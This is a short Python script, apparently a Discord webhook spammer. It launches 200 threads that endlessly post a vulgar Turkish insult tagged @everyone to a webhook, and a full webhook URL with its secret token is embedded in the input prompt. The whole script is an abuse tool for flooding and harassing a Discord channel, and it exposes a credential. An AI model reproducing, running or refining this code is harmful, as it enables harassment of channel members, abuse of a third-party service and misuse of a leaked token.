import time, requests, pyfiglet, threading
print(pyfiglet.figlet_format("python3 main.py"))

msg = input("Please Insert WebHook Spam Message: HEPİNİZİN AMK @everyone")
webhook = input("Please Insert WebHook URL: https://discord.com/api/webhooks/1458178087257899161/Hk147RnaJwv2ul8Onp1LSe5F85YBDcodAXBbDNEJaXRi7xKNLXdXrWBnB8Osr60g-ENJ")
th = int(input('Number of thread ? (200 recommended): 200'))
sleep = int(input("Sleeping time ? (recommended 2): 2"))
def spam():
    while True:
        try:
            data = requests.post(webhook, json={'content': msg})
            if data.status_code == 204:
                print(f"Sent MSG {msg}")
        except:
            print("Bad Webhook :" + webhook)
        time.sleep(sleep)
    
for x in range(th):
    t = threading.Thread(target = spam)
    t.start()

